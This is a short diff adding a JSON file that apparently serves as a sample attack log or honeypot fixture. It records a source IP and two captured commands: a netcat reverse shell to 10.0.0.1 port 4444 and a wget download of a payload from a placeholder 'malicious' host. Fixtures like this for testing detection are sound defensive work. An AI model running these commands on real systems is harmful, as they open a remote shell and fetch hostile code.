@@ -1,0 +1,14 @@
+{
+  "source_ip": "198.51.100.5",
+  "events": [
+    {
+      "ts": 1763366325.8029678,
+      "cmd": "nc -e /bin/sh 10.0.0.1 4444"
+    },
+    {
+      "ts": 1763366325.8029685,
+      "cmd": "wget http://malicious/payload"
+    }
+  ],
+  "creds": []
+}
